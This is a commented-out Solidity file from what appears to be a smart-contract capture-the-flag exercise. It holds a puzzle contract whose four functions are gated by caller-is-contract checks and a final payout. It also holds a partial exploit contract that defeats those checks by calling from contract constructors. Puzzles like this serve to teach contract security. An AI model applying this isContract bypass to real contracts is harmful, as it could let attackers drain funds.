// // SPDX-License-Identifier: UNLICENSED
// pragma solidity >=0.8.0;

// import "hardhat/console.sol";
// import "@openzeppelin/contracts/utils/Address.sol";

// interface ICalled {
//     function sup() external returns (uint256);
// }

// interface IChallenge_teryanarmen {
//     function first() external;

//     function second() external;

//     function third() external;

//     function fourth() external;

//     function winner() external view returns (address);
// }

// contract Exploit_teryanarmen {
//     IChallenge_teryanarmen instance;

//     uint256 public sup = 1337;

//     constructor(IChallenge_teryanarmen _instance) payable {
//         instance = _instance;

//         Exploit_teryanarmen_Third third = new Exploit_teryanarmen_Third(instance);

//         instance.second();
//     }

//     function finalize() external payable {
//         // instance.first();
//         // sup = 80085;
//         // instance.fourth();

//         selfdestruct(payable(address(this)));
//     }

//     // receive() external payable {}
// }

// contract Exploit_teryanarmen_Third {
//     constructor(IChallenge_teryanarmen _instance) {
//         _instance.third();
//     }
// }

// contract Challenge2 {
//     using Address for address;

//     State public state;
//     address public winner;

//     modifier onlyWinner() {
//         require(msg.sender == winner, "oops");
//         _;
//     }
//     modifier onlyState(State _state) {
//         require(state == _state, "no...");
//         _;
//     }
//     modifier onlyContract() {
//         require(Address.isContract(msg.sender), "try again");
//         _;
//     }
//     modifier onlyNotContract() {
//         require(!Address.isContract(msg.sender), "yeah, no");
//         _;
//     }

//     enum State {
//         ZERO,
//         ONE,
//         TWO,
//         THREE
//     }

//     function first() public onlyNotContract onlyState(State.ZERO) {
//         winner = msg.sender;
//         state = State.ONE;
//     }

//     function second() public onlyWinner onlyContract onlyState(State.ONE) {
//         require(ICalled(msg.sender).sup() == 1337, "not leet");
//         state = State.TWO;
//     }

//     function third() public onlyWinner onlyNotContract onlyState(State.TWO) {
//         state = State.THREE;
//     }

//     function fourth() public onlyWinner onlyContract onlyState(State.THREE) {
//         require(ICalled(msg.sender).sup() == 80085, "not boobs");
//         payable(msg.sender).transfer(address(this).balance);
//     }
// }
